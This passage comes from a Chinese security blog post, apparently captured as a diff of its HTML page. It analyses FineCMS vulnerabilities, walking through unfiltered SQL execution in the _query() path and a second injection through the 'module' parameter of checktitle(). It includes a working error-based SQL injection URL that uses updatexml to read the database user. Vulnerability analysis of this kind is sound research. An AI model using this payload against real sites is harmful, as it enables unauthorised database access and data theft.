+                                <span class="nv">$data</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ci</span><span class="o">-&gt;</span><span class="na">field_format_value</span><span class="p">(</span><span class="nv">$fields</span><span class="p">,</span> <span class="nv">$t</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+                            <span class="p">}</span>
+                            <span class="c1">//$cache = $this-&gt;ci-&gt;set_cache_data($name, $data, $system[&#39;cache&#39;]);
+</span><span class="c1"></span>                            <span class="nv">$cache</span> <span class="o">=</span> <span class="nv">$system</span><span class="p">[</span><span class="s1">&#39;cache&#39;</span><span class="p">]</span> <span class="o">?</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ci</span><span class="o">-&gt;</span><span class="na">set_cache_data</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="nv">$data</span><span class="p">,</span> <span class="nv">$system</span><span class="p">[</span><span class="s1">&#39;cache&#39;</span><span class="p">])</span> <span class="o">:</span> <span class="nv">$data</span><span class="p">;</span>
+                        <span class="p">}</span>
+                        <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$cache</span><span class="p">;</span>
+                    <span class="p">}</span>
+                    <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_return</span><span class="p">(</span><span class="nv">$system</span><span class="p">[</span><span class="s1">&#39;return&#39;</span><span class="p">],</span> <span class="nv">$data</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">,</span> <span class="nv">$total</span><span class="p">,</span> <span class="nv">$pages</span><span class="p">,</span> <span class="nv">$pagesize</span><span class="p">);</span>
+                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                    <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_return</span><span class="p">(</span><span class="nv">$system</span><span class="p">[</span><span class="s1">&#39;return&#39;</span><span class="p">],</span> <span class="s1">&#39;参数不正确，SQL语句必须用单引号包起来&#39;</span><span class="p">);</span> <span class="c1">// 没有查询到内容
+</span><span class="c1"></span>                <span class="p">}</span>
+                <span class="k">break</span><span class="p">;</span>
+</code></pre></div><p>这里想说一下就是<code>preg_match</code>这个函数的作用，他匹配过后sql是一个数组：</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">array(2) {
+  [0]=&gt;
+  string(23) &#34;sql=&#39;select version();&#39;&#34;
+  [1]=&gt;
+  string(17) &#34;select version();&#34;
+}
+</code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/finecms11/8.png" alt=""></p>
+<p>这里判断了开头的位置是否只使用了<code>select</code></p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"> <span class="k">if</span> <span class="p">(</span><span class="nx">stripos</span><span class="p">(</span><span class="nv">$sql</span><span class="p">,</span> <span class="s1">&#39;SELECT&#39;</span><span class="p">)</span> <span class="o">!==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+                        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_return</span><span class="p">(</span><span class="nv">$system</span><span class="p">[</span><span class="s1">&#39;return&#39;</span><span class="p">],</span> <span class="s1">&#39;SQL语句只能是SELECT查询语句&#39;</span><span class="p">);</span>
+</code></pre></div><p>再往下看，这一句才是执行SQL的地方，传入sql内容和<code>$system['site']</code>默认是<code>1</code>,<code>$system['cache']</code> 默认缓存时间是<code>3600</code></p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"> <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">,</span> <span class="nv">$system</span><span class="p">[</span><span class="s1">&#39;site&#39;</span><span class="p">],</span> <span class="nv">$system</span><span class="p">[</span><span class="s1">&#39;cache&#39;</span><span class="p">]);</span>
+</code></pre></div><p>继续跟进<code>_query()</code>函数</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="k">public</span> <span class="k">function</span> <span class="nf">_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">,</span> <span class="nv">$site</span><span class="p">,</span> <span class="nv">$cache</span><span class="p">,</span> <span class="nv">$all</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ci</span><span class="o">-&gt;</span><span class="na">site</span><span class="p">[</span><span class="nv">$site</span><span class="p">];</span>
+        <span class="c1">// 数据库对象
+</span><span class="c1"></span>        <span class="nv">$db</span> <span class="o">=</span> <span class="nv">$site</span> <span class="o">?</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ci</span><span class="o">-&gt;</span><span class="na">site</span><span class="p">[</span><span class="nv">$site</span><span class="p">]</span> <span class="o">:</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ci</span><span class="o">-&gt;</span><span class="na">db</span><span class="p">;</span>
+        <span class="nv">$cname</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$sql</span><span class="o">.</span><span class="nx">dr_now_url</span><span class="p">());</span>
+        <span class="c1">// 缓存存在时读取缓存文件
+</span><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="nv">$cache</span> <span class="o">&amp;&amp;</span> <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ci</span><span class="o">-&gt;</span><span class="na">get_cache_data</span><span class="p">(</span><span class="nv">$cname</span><span class="p">))</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="nv">$data</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="c1">// 执行SQL
+</span><span class="c1"></span>        <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">db_debug</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">;</span>
+        <span class="nv">$query</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$query</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="s1">&#39;SQL查询解析不正确：&#39;</span><span class="o">.</span><span class="nv">$sql</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="c1">// 查询结果
+</span><span class="c1"></span>        <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$all</span> <span class="o">?</span> <span class="nv">$query</span><span class="o">-&gt;</span><span class="na">result_array</span><span class="p">()</span> <span class="o">:</span> <span class="nv">$query</span><span class="o">-&gt;</span><span class="na">row_array</span><span class="p">();</span>
+
+        <span class="c1">// 开启缓存时，重新存储缓存数据
+</span><span class="c1"></span>        <span class="nv">$cache</span> <span class="o">&amp;&amp;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ci</span><span class="o">-&gt;</span><span class="na">set_cache_data</span><span class="p">(</span><span class="nv">$cname</span><span class="p">,</span> <span class="nv">$data</span><span class="p">,</span> <span class="nv">$cache</span><span class="p">);</span>
+
+        <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">db_debug</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>
+        
+        <span class="k">return</span> <span class="nv">$data</span><span class="p">;</span>
+    <span class="p">}</span>
+</code></pre></div><p>没有对函数进行任何过滤<code>     $query = $db-&gt;query($sql);</code>，直接带入了我们的语句。</p>
+<p>官方的修复方法：删除了<code>data2()</code>函数</p>
+<h1 id="0x06-任意sql语句执行2">0x06 任意SQL语句执行2</h1>
+<h2 id="1漏洞复现-3">1.漏洞复现</h2>
+<p>浏览器：</p>
+<p><code>http://getpass1.cn/index.php?s=member&amp;c=api&amp;m=checktitle&amp;id=1&amp;title=1&amp;module=news,(select%20(updatexml(1,concat(1,(select%20user()),0x7e),1)))a</code></p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/finecms11/9.png" alt=""></p>
+<h2 id="2-漏洞分析">2. 漏洞分析</h2>
+<p>文件在<code>finecms/dayrui/controllers/member/Api.php</code>的<code>checktitle()</code>函数</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php">    <span class="k">public</span> <span class="k">function</span> <span class="nf">checktitle</span><span class="p">()</span> <span class="p">{</span>
+
+        <span class="nv">$id</span> <span class="o">=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">input</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">);</span>
+        <span class="nv">$title</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">input</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;title&#39;</span><span class="p">,</span> <span class="k">TRUE</span><span class="p">);</span>
+        <span class="nv">$module</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">input</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;module&#39;</span><span class="p">);</span>
+        
+        <span class="p">(</span><span class="o">!</span><span class="nv">$title</span> <span class="o">||</span> <span class="o">!</span><span class="nv">$module</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="k">exit</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
+
+        <span class="nv">$num</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">where</span><span class="p">(</span><span class="s1">&#39;id&lt;&gt;&#39;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">where</span><span class="p">(</span><span class="s1">&#39;title&#39;</span><span class="p">,</span> <span class="nv">$title</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">count_all_results</span><span class="p">(</span><span class="nx">SITE_ID</span><span class="o">.</span><span class="s1">&#39;_&#39;</span><span class="o">.</span><span class="nv">$module</span><span class="p">);</span>
+        <span class="k">echo</span> <span class="nv">$num</span><span class="p">;</span>
+        <span class="nv">$num</span> <span class="o">?</span> <span class="k">exit</span><span class="p">(</span><span class="nx">fc_lang</span><span class="p">(</span><span class="s1">&#39;&lt;font color=red&gt;&#39;</span><span class="o">.</span><span class="nx">fc_lang</span><span class="p">(</span><span class="s1">&#39;重复&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&lt;/font&gt;&#39;</span><span class="p">))</span> <span class="o">:</span> <span class="k">exit</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
+    <span class="p">}</span>
+</code></pre></div><p>其他的没什么过滤，主要是CI框架里面的一些内置方法，比如<code>count_all_results</code>，可以到http://codeigniter.org.cn/user_guide/database/query_builder.html?highlight=count_all_results#CI_DB_query_builder::count_all_results  查看用法</p>
+<p>还有一个就是<code>SITE_ID</code>变量，它是指</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/finecms11/10.png" alt=""></p>
+<blockquote>
+<p>站点是系统的核心部分，各个站点数据独立，可以设置站点分库管理</p>
+</blockquote>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/finecms11/11.png" alt=""></p>
+<p>剩下也没什么可分析了，不懂updatexml语句可以看下面的参考链接</p>
+<h1 id="0x07-结束">0x07 结束</h1>
+<p>还有一个远程命令执行漏洞没能复现，是在api的html()函数，说是可以用&amp;来突破,但是eval只能用<code>;</code>来结束语句的结束。</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="k">function</span> <span class="nf">dr_safe_replace</span><span class="p">(</span><span class="nv">$string</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$string</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;%20&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
+    <span class="nv">$string</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;%27&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
+    <span class="nv">$string</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;%2527&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
+    <span class="nv">$string</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;*&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
+    <span class="nv">$string</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;&#34;&#39;</span><span class="p">,</span> <span class="s1">&#39;&amp;quot;&#39;</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
+    <span class="nv">$string</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;&#39;&#34;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
+    <span class="nv">$string</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;&#34;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
+    <span class="nv">$string</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
+    <span class="nv">$string</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;&lt;&#39;</span><span class="p">,</span> <span class="s1">&#39;&amp;lt;&#39;</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
+    <span class="nv">$string</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;&gt;&#39;</span><span class="p">,</span> <span class="s1">&#39;&amp;gt;&#39;</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
+    <span class="nv">$string</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;{&#34;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
+    <span class="nv">$string</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;}&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
+    <span class="k">return</span> <span class="nv">$string</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div><h1 id="0x08-参考">0x08 参考</h1>
+<p><a href="https://www.t00ls.net/thread-41630-1-1.html">https://www.t00ls.net/thread-41630-1-1.html</a></p>
+<p><a href="https://www.t00ls.net/viewthread.php?tid=44262">https://www.t00ls.net/viewthread.php?tid=44262</a></p>
+<p><a href="http://lu4n.com/finecms-rce-0day/">http://lu4n.com/finecms-rce-0day/</a></p>
+<p><a href="https://blog.csdn.net/vspiders/article/details/77430024">https://blog.csdn.net/vspiders/article/details/77430024</a></p>
+<p><a href="http://www.cnblogs.com/Loofah/archive/2012/05/10/2494036.html">http://www.cnblogs.com/Loofah/archive/2012/05/10/2494036.html</a></p>
+
+    </article>
+
+    
+    <div class="prevnext">
+        
+
+
+
+<ul class="prevnext">
+    
+    <li>上一篇：
+        <a href="https://getshe11.com/post/python-web-guide/">
+            Python Web学习方法
+        </a>
+    </li>
+    
+    
+    <li>下一篇：
+        <a href="https://getshe11.com/post/upload-labs/">
+            Upload-Labs 通关笔记
+        </a>
+    </li>
+    
+</ul>
+
+    </div>
+    
+    <div class="post-comments">
+        
+  
+  
+
+  
+    <script src="https://utteranc.es/client.js"
+            repo="F0r3at/Getshe11.com"
+            issue-term="pathname"
+            theme="github-light"
+            crossorigin="anonymous"
+            async>
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://github.com/utterance">comments powered by utterances.</a></noscript>
+
+    </div>
+</div>
+            </div>
+            
+            <div class="col-second">
+                <div class="col-box col-box-author">
+    <img class="avatar" src="../../images/avatar.jpg" alt="F0rmat">
+    <div class="col-box-title name">F0rmat</div>
+    <p>Stay Hungry, Stay Foolish.</p>
+    <p class="contact">
+        <a href="http://github.com/F0r3at">Github</a>
+    </p>
+</div>
+
+<div class="col-box">
+    <div class="col-box-title">Newest Posts</div>
+    <ul class="post-list">
+        
+        <li>
+            <a href="https://getshe11.com/post/pd-chrome-3d/" class="post-link">关于Kali2020安装Parallels Tools后Chrome显示空白</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/install-parallels-tools-on-kali-linux-2020.4/" class="post-link">Kali Linux 2020.4安装Parallels Tools</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/pathfinder/" class="post-link">Hackthebox-Pathfinder</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/domain-security/" class="post-link">Windows认证与域渗透</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/shield/" class="post-link">Hackthebox-Shield</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/archetype/" class="post-link">Hackthebox-Archetype</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/oopsie/" class="post-link">Hackthebox-Oopsie</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/vaccine/" class="post-link">Hackthebox-Vaccine</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/bc-penetration-diary/" class="post-link">Bc站渗透日记</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/maccms8-latest-command-execution-vulnerability/" class="post-link">Maccms8最新命令执行漏洞</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/seacms9.92-from-variable-override-to-getshell/" class="post-link">Seacms9.92从变量覆盖到getshell</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/seacms-front-desk-getshell/" class="post-link">Seacms&lt;=9.92前台Getshell</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/a-difficult-penetration-process/" class="post-link">一次艰难的渗透提权过程</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/an-app-distribution-system-upload-vulnerability/" class="post-link">某云分发APP上传漏洞</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/analysis-of-php-deserialization-vulnerabilities/" class="post-link">浅析PHP反序列化漏洞</a>
+        </li>
+        
+    </ul>
+</div>
+
+<div class="col-box post-toc hide">
+    <div class="col-box-title">TOC</div>
+</div>
+            </div>
+        </div>
+    </div>
+    
+    <footer class="footer">
+        <div class="wrapper">
+    © 2021    <a href="https://getshe11.com">F0rmat</a>
+</div>
+    </footer>
+    
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery@1.11.0/dist/jquery.min.js"></script>
+
+<script src="/js/easybook.js"></script>
+
+<script src="/js/lazysizes.min.js"></script>
+
+<script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.12/dist/js/lightgallery-all.min.js"></script>
+<script src="/js/figure.js"></script>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-XXXXXXXX-X', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+
+
+
+</body>
+
+</html>
